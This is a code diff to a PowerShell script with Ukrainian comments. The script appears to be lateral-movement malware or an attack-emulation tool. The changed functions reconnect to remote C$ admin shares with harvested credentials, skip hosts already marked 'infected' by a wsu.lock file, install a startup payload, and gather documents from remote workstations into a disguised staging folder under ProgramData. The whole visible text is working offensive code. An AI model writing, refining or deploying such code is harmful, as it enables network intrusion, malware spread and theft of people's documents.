@@ -185,20 +185,21 @@ function Test-SmbCredential {
 function Install-StartupPayload {
     param([string]$TargetIP, [string]$Username = "", [string]$Password = "")
 
-    # Reconnect SMB з кредами — сесія від Test-SmbCredential може протухнути
+    # Перевіряємо чи сесія ще жива — якщо ні, reconnect з кредами
     $share = "\\$TargetIP\C$"
-    net use $share /delete 2>$null | Out-Null
-    if ($Username -and $Password) {
+    $net_state = (net use 2>&1 | Where-Object { $_ -match [regex]::Escape($TargetIP) -and $_ -match 'OK' })
+    if (-not $net_state) {
+        Write-Log "Install-StartupPayload: reconnecting SMB as $Username"
         $Domain = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { $env:USERDOMAIN }
+        net use $share /delete 2>$null | Out-Null
         $r = net use $share /user:"$Domain\$Username" $Password 2>&1
         if ($LASTEXITCODE -ne 0) {
             $r = net use $share /user:$Username $Password 2>&1
         }
         if ($LASTEXITCODE -ne 0) {
-            Write-Log "Install-StartupPayload: SMB reconnect failed for $TargetIP" -Level "WARN"
+            Write-Log "Install-StartupPayload: SMB reconnect failed" -Level "WARN"
             return $false
         }
-        Write-Log "Install-StartupPayload: SMB reconnected as $Username"
     }
 
     # Перевірка wsu.lock — якщо є, машина вже заражена → пропустити
@@ -279,7 +280,19 @@ function Install-StartupPayload {
 # ── Зібрати документи з віддаленої WS після SMB підключення (A07) ────────────
 
 function Collect-RemoteDocs {
-    param([string]$TargetIP)
+    param([string]$TargetIP, [string]$Username = "", [string]$Password = "")
+
+    # Переконуємось що SMB сесія жива перед рекурсивним скануванням
+    $share = "\\$TargetIP\C$"
+    $net_state = (net use 2>&1 | Where-Object { $_ -match [regex]::Escape($TargetIP) -and $_ -match 'OK' })
+    if (-not $net_state -and $Username -and $Password) {
+        $Domain = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { $env:USERDOMAIN }
+        net use $share /delete 2>$null | Out-Null
+        net use $share /user:"$Domain\$Username" $Password 2>$null | Out-Null
+        if ($LASTEXITCODE -ne 0) {
+            net use $share /user:$Username $Password 2>$null | Out-Null
+        }
+    }
 
     $docs_dir = "C:\ProgramData\upd_logs\docs"
     if (-not (Test-Path $docs_dir)) {
@@ -407,7 +420,7 @@ foreach ($target in $smb_targets) {
     }
 
     # ── Збір документів з WS-2 (A07) ─────────────────────────────────────────
-    Collect-RemoteDocs -TargetIP $target | Out-Null
+    Collect-RemoteDocs -TargetIP $target -Username $valid_user -Password $valid_pass | Out-Null
 
     Disconnect-Smb -TargetIP $target
 }
